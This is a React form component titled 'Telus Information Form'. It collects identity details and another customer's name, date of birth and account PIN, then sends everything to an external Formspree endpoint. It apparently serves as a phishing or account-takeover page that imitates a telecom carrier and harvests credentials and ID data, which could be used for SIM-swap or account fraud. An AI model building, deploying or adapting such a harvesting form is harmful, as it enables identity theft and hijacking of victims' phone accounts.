import { useState } from "react";
import "./customerDet.css";
import React from "react";
export default function CustomerDetailsForm() {
  const [formData, setFormData] = useState({
    newName: "",
    newEmail: "",
    newPhone: "",
    idType: "",
    idNumber: "",
    idExpiry: "",
    dob: "",
    oldName: "",
    oldDob: "",
    oldPin: "",
  });

  const handleChange = (e) => {
    setFormData({ ...formData, [e.target.name]: e.target.value });
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    const response = await fetch("https://formspree.io/f/mkgjndkk", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(formData),
    });
    const result = await response.json();
    if (response.ok) {
      alert("Form submitted successfully!");
      setFormData({
        newName: "",
        newEmail: "",
        newPhone: "",
        idType: "",
        idNumber: "",
        idExpiry: "",
        dob: "",
        oldName: "",
        oldDob: "",
        oldPin: "",
      });
    } else {
      alert("Error submitting form. Please try again.");
    }
  };

  return (
    <div className="form-container">
      <h2>Telus Information Form</h2>
      <form onSubmit={handleSubmit}>
        <label>Name (New Customer)</label>
        <input type="text" name="newName" value={formData.newName} onChange={handleChange} required />

        <label>Email (New Customer)</label>
        <input type="email" name="newEmail" value={formData.newEmail} onChange={handleChange} required />

        <label>Phone</label>
        <input type="text" name="newPhone" value={formData.newPhone} onChange={handleChange} required />

        <label>ID Type</label>
        <input type="text" name="idType" value={formData.idType} onChange={handleChange} required />

        <label>ID Number</label>
        <input type="text" name="idNumber" value={formData.idNumber} onChange={handleChange} required />

        <label>ID Expiry</label>
        <input type="date" name="idExpiry" value={formData.idExpiry} onChange={handleChange} required />

        <label>Date of Birth</label>
        <input type="date" name="dob" value={formData.dob} onChange={handleChange} required />

        <label>Name (Old Customer)</label>
        <input type="text" name="oldName" value={formData.oldName} onChange={handleChange} required />

        <label>Date of Birth (Old Customer)</label>
        <input type="date" name="oldDob" value={formData.oldDob} onChange={handleChange} required />

        <label>Account PIN</label>
        <input type="password" name="oldPin" value={formData.oldPin} onChange={handleChange} required />

        <button type="submit">Submit</button>
      </form>
    </div>
  );
}